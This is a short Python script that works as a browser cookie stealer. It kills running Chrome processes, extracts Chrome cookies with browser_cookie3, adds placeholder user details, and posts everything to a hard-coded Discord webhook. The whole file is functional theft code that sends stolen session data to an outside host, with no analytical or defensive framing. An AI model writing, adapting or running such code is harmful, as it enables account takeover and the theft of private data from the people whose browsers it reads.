import os
import requests
import browser_cookie3
from discordwebhook import Discord
import subprocess

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp"

def send_webhook(message):
    """Send message to Discord webhook."""
    try:
        webhook = Discord(url=WEBHOOK_URL)
        webhook.set_content(content=message)
        webhook.execute()
    except Exception as e:
        print(f"Error sending webhook: {e}")

def get_browser_data():
    """Extract browser data (cookies)"""
    try:
        # Use browser_cookie3 to get cookies from Chrome
        cookies = browser_cookie3.chrome()
        return cookies
    except Exception as e:
        print(f"Error getting cookies: {e}")
        return None

def get_user_info():
    """Get user info from the system."""
    try:
        # Placeholder for actual user info gathering logic
        user_info = {
            "username": "user_name",
            "email": "user_email",
            "phone": "user_phone"
        }
        return user_info
    except Exception as e:
        print(f"Error getting user info: {e}")
        return None

def terminate_chrome():
    """Terminate Chrome processes on Linux/Android."""
    try:
        os.system('pkill chrome')  # Terminate Chrome on Linux/Android
    except Exception as e:
        print(f"Error terminating Chrome: {e}")

def main():
    print("Starting the process...")

    # Terminate Chrome process
    terminate_chrome()

    # Get browser cookies
    cookies = get_browser_data()
    if cookies:
        print("Cookies retrieved successfully")
    else:
        print("No cookies found")
    
    # Get user information
    user_info = get_user_info()
    if user_info:
        print("User information retrieved successfully")
    else:
        print("No user information found")
    
    # Sending data to Discord webhook
    message = f"User Info: {user_info}\nCookies: {cookies}"
    send_webhook(message)
    print("Data sent to webhook")

if __name__ == "__main__":
    main()
